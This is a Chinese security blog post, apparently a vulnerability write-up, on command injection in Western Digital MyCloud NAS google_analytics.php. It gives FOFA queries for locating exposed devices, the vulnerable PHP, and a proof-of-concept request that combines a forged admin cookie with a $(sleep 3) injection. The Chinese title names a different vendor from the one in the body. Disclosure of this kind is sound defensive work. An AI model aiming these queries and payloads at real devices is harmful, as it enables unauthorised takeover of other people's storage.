---
title: "西部数码 NAS google_analytics.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-google_analytics-rce.html
asset_dir: assets/西部数码-nas-google_analytics.php-命令执行漏洞
---

# 西部数码 NAS google\_analytics.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/6 13:40
- 1467浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

Western Digital

软件

MyCloud NAS

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS google\_analytics.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

网络统计与分析

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

计算机安全

漏洞修复方案

云安全解决方案

直接看 `google_analytics.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;
include ("./lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check()==0)
{
    echo json_encode($r);
    exit;
}

$action = $_POST['cmd'];
if ($action == "") $action = $_GET['cmd'];

$r = new stdClass();
switch ($action)
{
    case "set":
    {
       $opt = $_POST['opt'];
       $arg = $_POST['arg'];
       $run_cmd = sprintf("ganalytics --%s %s > /dev/null &", $opt, ($arg != "") ? $arg : "");

       system($run_cmd);

       $r->run_cmd = $run_cmd;
       $r->success = true;
       echo json_encode($r);
    }
    break; 
}
?>
```

当`cmd=set`时，从请求中获取 `opt` 和 `arg` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 $run\_cmd中，然后用`system()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞预警服务

# 漏洞复现

```
GET /web/google_analytics.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin

cmd=set&opt=$(sleep 3)
```

深入探索

漏洞扫描器

服务器安全服务

数据库

[![西部数码 NAS google_analytics.php 命令执行漏洞](images/img-001-71d844707132.webp)](https://image.mrxn.net/fd549b518eaf4efb97b41d4ecf047d9b.webp)

成功延时 3 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK2UlEQVR4AeyaAXLbSg5E/XL/O/9Na+qNIHBIyV7JUlWYSm8DjQY4HoiJvfl/vr6+/vsp/mu/6hxLaubPZueHnZ04MJejCTVZ/Yj1ytW70mr90TgL+es9f3/KDcyF/N3w16Pohwe+gBsZuGjOhJHDlW2AofUchg77bE8Yhi/xCp4lDGtvamI1IxqMXn3h6BXRHkXtmwup4hm/7wY2C4GxfdjyvWOuPhH2WDNfMYxn6l3xqq9r9qnDmGse7p5orwCMZ8OWV8/bLGRlOrXfu4GXLQRuPxF+SX4yw10zh9tewNJDf88Bl7+/ZtNBAMOb8wTVmryi1hLD6AWSPgUvW8hTTvcPDnnZQvxkHd0pcPkkw+DudUYYhgfu894c2PZmdgCjVnthaHDL1fPs+GULefZB/5V5r1nIv3J7L/g6NwvJ67uHZzwfrq+/z3Fuz9VXrHfFK3+06k0ewDhP4g796uYr1tN55VXr3uSbhUQ88b4bmAuB8UmB+/zIcWHM8dMAt3l0uNVgnQPz293+bBg9QC/NHLh88zCFEuQcQZFmCKMv9QBGrgFGDihNBi7PhPs8m/4GcyF/4/P3B9zAn2z+p/D89puHu2YO109M19IXwPAkvgdnhLsXxpzUglpPHsC+Rz8Mj7mcfrHSrH2HzzfEm/wQ3iwE1p+GnBdGDe5z/BUweo40P0nVsxfDmAdbtsd5sPXA0LrH3sp6ZBi91QO3Gowc7nOds1lILZ7x79/AZiF+ClZHsdZZb9XVYHxCaq3H3WtefTDm9Jp5WH/iCvUVw5hrrfY9I3ZuuM+LFsA4A/C1WcjX5/76J052LuTD1jwXAtfXBq5xPS9cdbjGee0CuGr2RQ/gWoPbWK8cf2B+xPEJGHN7vuqHtReGDsw24PJDnkKfD1iarGcKJTiqzYUU/xm+8QY2C+nbAy6fDmAeU48MXDzTsAj0LkobCcY8uHLvh2sNRtw9Pa8P6jXzytV/L7ZPH4wzwZWtyTBq9oY3C9F88ntu4A+MLfl4GHm2tQcYHhhsb/WryTC81dNjvSuGdX/1wvCowToHtDzEnlMzcPkTQT0MQ4PB0QJ7jhhGD3B+2/v1Yb9+9EdWNl+x+prgunVgWoDLpwu2rMnZ5uGVVvXUkwcwZicOYOTxiOgBjFriDr2w79nrUXdGZRjz1PSGf7SQNJ54zQ2cC3nNvf546mYhq9fI6TBeNbjlVV3taJ61zjDmOyMMQ4PB0QIYOZD0Bn3uTfEbiXNs6Xn0lRa9Arj8ca0Gt3n0zUIinnjfDWz+xRButwYjh+u/a/dPg3nl/iVZ63pyGM9IvAf7ZX3mla3BmAv73L3mYdjvA2KZAC6ffthnzfWsPT7fEG/pQ3jzg6Ebg7Hp1Tlh1PSuPGowvOb2hNU6p9YBYw4MtgdGDle2JvdZNe8e88rVX+OfempfYrie/XxDciMfhLkQGFvybPWTYAzDY653xY94YMzr/TB0uHL3rPL+THO4zoHb2DlwqwOW5t8NCsBFMw/DrQYj9wxhGBoMTl/HXEgvnPl7bmAuJBsMPAaMLcKVUw9gaN1rXjn+QA1GL6C04fg7NKkDl0+peViPDMNjXjn+oGqJo4nkK9yr1x4YZwCmfNQ/FzLdZ/CMG/jxjHMhP7661zTOHwwdD1z+KDD39Qp3bS+PDmMODI4WZI5IHvQ8WgCjF64/lEbfAwy/82T95uGVFh3GDEDL7n/oPQ1/g/QGf8PL78TBJfnG/5xvyDcu6zescyHA5c3IVgMfDkOH+2xPODMqonVYh9vZ3VdzGF41GDmgdPk64JpbAO7WPFPYvs5wnQPHce9d5XmWmAtZGU/t929g83+dwNi4G6tHUuusB0YvPMb2Oc8cRr96GIamJ9oe9MBtj/qKnbWqwf059nd+ZB6M+cD5b+pfH/brR39kwdho/1rqp6PXzKsHxhwYXGuJYeiw/10WXD0+Q86MoOfRYPRZg5HDla3FH5gfMYz+lSczglVN7UcLsfnk59/AuZDn3+n/NXHzg6HTgK/AvHJeu6Bq9+L4g8wU9kQP1GXrR5w+sedb1Vda+tUrex7ZWvwdR7W9fnvC5xvSb/TN+WYh2VJFPZ8b7qyn6mrOsmZeuXtrzViP7LwVd0/Pj3r0rtiz2F89ap2rp8d6q75ZSC2e8e/fwPzB0O17BLenHraWODCXowk155g/wqsetT6/zrPWuXqM9ezl0X1m4qDnzginXhGtw7pzrJuHzzfEW/oQ3v0uy+3Vc6plk0GtJY4m9EYPzK2Hox8hHtH7zWu/3qolVrcnrJZ60PNo8QWJK6IF9oRrPXG0juhBegPr0cT5hngTH8JzIatt7Z0x2w16PZp4ZJ6ezs51VljtO+zcn/TYG36kP2cMujea6DVz6+G5EIsnv/cG3rCQ937Bn/70uZC8LkFe0eDo4KkHR55eiz/IM4Qec1l9xXoyK1h5ogd65WjCPms9j77Sqm497NzUK1Lbgz57w3Mhe02n/rs3MBeS7QT98dE63Gzn6us18+rxWVVLvKfXmp5HOH1B9fbz9Dz+rtmfWmC+4tSDWtubVz1zIVU84/fdwFyI23vkKNl8hT3OCKvJ+s3D8QWJV0hNrOpd0yv3+iO5veE9f2pBrScP+tdpXrn29XgupBfO/D03MBfiBrPlwOMkFistNXVnrDi+Dvvke/X4nJ14D93j3D3/nu4c+83l2rfSUrc3nDxIHKx65kJiPPH+GzgX8v4d3JxgsxBfoxXbuapFs/5dzusbZEZgf2KR+hFSsy9xYL7iPnflUXvEm+dV2FvZupp55c1CNJ/8nhuY/2Lo4+u2EqtXjh6oJe7oNXM/bWE12RmpBebh5BX2VLZetcQrPTOD1Cv0htXjC/Zy9XucmYG+xB3nG+LtfAjPfzHMJyA4OlfqgVvVa17ZWuf0i17r+WreI732Oe87PXrD9vd5PY9PTY4WmIeTB4mDPCOIJs43xJv4EJ4LycZWWJ0zWw1WtT3N2au6NTmzO3qf3sp67K21xOrh5MFRjzU5/sC8cmZWWDvSMivQG54LSXLi/Tcwv8uqm0x8dLRsNTjyWIsv6HnV8rwKvStOX7CqqaUeOFN9xfEF1uwJr7SqWw9nRkW0oGrpDaLv4XxD9m7mTfq5kMOL//3i/La3PzqvVoeeR3S9nWtvfZ0T603cYU2uc3qsxxk9j67WOTVhrefqlfsZzKunz1l5zjek3tgHxPMvdbf3HT46v9uX9db5at3Tdetha/JqnjU5fYF5OHmQuCJaR63fiz3PyudcPXL1nm9IvY0PiOdC3N4j/J1z+ylw7qpXj7zy7GnODe95nBuP6Jq96pXt0XPER15n6pHrvLmQKp7x+25gsxC3uOK9Y642rbfXzMPdE63i6Ayrmlqfa17Z51QtsXo4+QqpBbXmsztXT3qCqiWOJjYLieHE+27gXMj77n755JcvpL/CNe8nsqbua1z5qKZPT2fnh60l3sPePP3OCOvtnJqw74hfvhAPc/JjN/CUhbjx+siVlnr/BCWP/ijiD1bzV9reXL2ZtQd79ZrrN/8uH/U/ZSHfPdDp37+BzULc3or3xuj1kxTu3pUnvgp71MzDanK0Dp/xqB5fn2ceTj3Ym5vaHtIf2Bvu3mgdm4X0pjP/3RuYC8k2H8VPjujsVW//lBx5rNnj3PBeTb2y/WrpD8zDyYPEQeIKZ4RTX6H6V/Vo1TMXksKJ99/AuZD37+DmBP8DAAD//yRwvF0AAAAGSURBVAMApE11vJy2ibsAAAAASUVORK5CYII=)

手机扫码阅读

数据备份与恢复
